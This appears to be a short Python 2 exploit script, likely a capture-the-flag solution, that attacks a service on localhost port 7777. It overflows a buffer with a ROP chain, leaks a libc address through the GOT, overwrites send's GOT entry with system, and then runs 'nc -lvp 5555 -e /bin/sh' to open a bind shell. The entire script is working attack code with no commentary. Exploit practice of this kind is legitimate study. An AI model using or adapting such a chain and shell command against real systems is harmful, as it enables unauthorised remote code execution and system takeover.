# http://nextline.tistory.com/102

from socket import *
from struct import *
from time import *

p = lambda x: pack('<L', x)
up = lambda x: unpack('<L', x)[0]

send_plt = p(0x8048610)
send_got = p(0x804a048)
recv_plt = p(0x80485f0)
system_off = 0xabc20
bss_add = p(0x0804a054)
ppppr = p(0x80489cc)
cmd = 'nc -lvp 5555 -e /bin/sh'

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 7777))


#print msg
print s.recv(1024)

#leak address
payload = "A" * 0x40c
payload += send_plt + ppppr + p(4) + send_got + p(4) + p(0)

#send_got overwrite
payload += recv_plt + ppppr + p(4) + send_got + p(4) + p(0)

#cmd setting
payload += recv_plt + ppppr + p(4) + bss_add + p(len(cmd)) + p(0)

#system(cmd)
payload += send_plt + p(0) + bss_add

#send payload
s.send(payload)

#system_add
send_add = up(s.recv(4))
system_add = send_add - system_off

#send_got overwrite
sleep(0.03)
s.send(p(system_add))

#send cmd
sleep(0.03)
s.send(cmd)
